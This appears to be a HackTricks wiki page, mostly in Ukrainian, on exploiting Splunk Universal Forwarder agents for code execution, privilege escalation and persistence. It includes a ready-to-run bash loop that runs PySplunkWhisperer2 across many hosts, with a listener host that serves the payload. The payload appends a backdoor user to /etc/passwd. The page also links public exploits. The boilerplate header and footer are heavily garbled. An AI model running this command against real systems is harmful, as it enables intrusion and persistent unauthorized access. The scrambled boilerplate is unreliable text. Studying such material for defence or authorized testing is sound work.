# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Якщо ви **перераховуєте** машину **всередині** або **ззовні** і знаходите **запущений Splunk** (порт 8090), якщо вам пощастить знати будь-які **дійсні облікові дані**, ви можете **зловживати сервісом Splunk** для **виконання оболонки** від імені користувача, який запускає Splunk. Якщо його запускає root, ви можете підвищити привілеї до root.

Також, якщо ви **вже root і сервіс Splunk не слухає лише на localhost**, ви можете **вкрасти** файл **паролів** **з** сервісу Splunk і **зламати** паролі або **додати нові** облікові дані до нього. І підтримувати стійкість на хості.

На першому зображенні нижче ви можете побачити, як виглядає веб-сторінка Splunkd.



## Підсумок експлуатації агента Splunk Universal Forwarder

Для отримання додаткових деталей перевірте пост [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише підсумок:

**Огляд експлуатації:**
Експлуатація, що націлена на агента Splunk Universal Forwarder (UF), дозволяє зловмисникам з паролем агента виконувати довільний код на системах, що запускають агента, потенційно компрометуючи всю мережу.

**Ключові моменти:**
- Агент UF не перевіряє вхідні з'єднання або автентичність коду, що робить його вразливим до несанкціонованого виконання коду.
- Загальні методи отримання паролів включають їх знаходження в мережевих каталогах, файлових спільних ресурсах або внутрішній документації.
- Успішна експлуатація може призвести до доступу на рівні SYSTEM або root на скомпрометованих хостах, ексфільтрації даних та подальшого проникнення в мережу.

**Виконання експлуатації:**
1. Зловмисник отримує пароль агента UF.
2. Використовує API Splunk для відправки команд або скриптів агентам.
3. Можливі дії включають витяг файлів, маніпуляцію обліковими записами користувачів та компрометацію системи.

**Вплив:**
- Повна компрометація мережі з правами SYSTEM/root на кожному хості.
- Потенціал для відключення ведення журналів, щоб уникнути виявлення.
- Встановлення бекдорів або програм-вимагачів.

**Приклад команди для експлуатації:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Використовувані публічні експлойти:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Зловживання запитами Splunk

**Для отримання додаткової інформації перегляньте пост [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
